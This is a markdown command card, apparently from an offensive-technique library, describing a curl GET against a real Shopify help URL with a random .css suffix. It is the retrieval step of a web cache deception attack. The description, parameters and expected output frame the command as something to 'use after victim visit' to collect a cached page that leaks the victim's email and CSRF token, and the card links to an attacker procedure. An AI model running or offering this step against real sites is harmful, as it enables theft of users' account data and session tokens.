---
id: cmd-curl-wcd-fetch-001
data: >-
  curl
  https://help.shopify.com/es/manual/your-account/copyright-and-trademark/abcdefg.css
tags:
  - http-request
  - cache-retrieval
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.243Z'
verified: false
validated: true
submitted: true
---
# curl-fetch-cached-wcd-page

## Command

```bash
curl https://help.shopify.com/es/manual/your-account/copyright-and-trademark/abcdefg.css
```

## Description

This command performs an unauthenticated HTTP GET request to the malicious WCD URL, retrieving the cached 404 page containing leaked victim data from Shopify's proxy. Use after victim visit to exploit the deception; no auth headers ensure cache hit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The full malicious path with random string and .css (e.g., https://help.shopify.com/.../abcdefg.css) | Yes |
| -o | Optional output file flag to save response | No |

## Examples

### Basic Usage

```bash
curl https://help.shopify.com/es/manual/your-account/copyright-and-trademark/abcdefg.css
```

### Advanced Usage

```bash
curl -o leaked_page.html https://help.shopify.com/es/manual/your-account/copyright-and-trademark/abcdefg.css --silent
```

## Expected Output

HTML response body of the cached 404 page, e.g., starting with <!DOCTYPE html> and including embedded user data like <script>var user = {email: 'victim@example.com', csrf: 'abc123'};</script>. Status 200 OK if cached successfully.

## Related

- [[Related Procedure]]: [[procedures/Retrieve-Cached-Victim-Page-As-Unauthenticated-Attacker]]
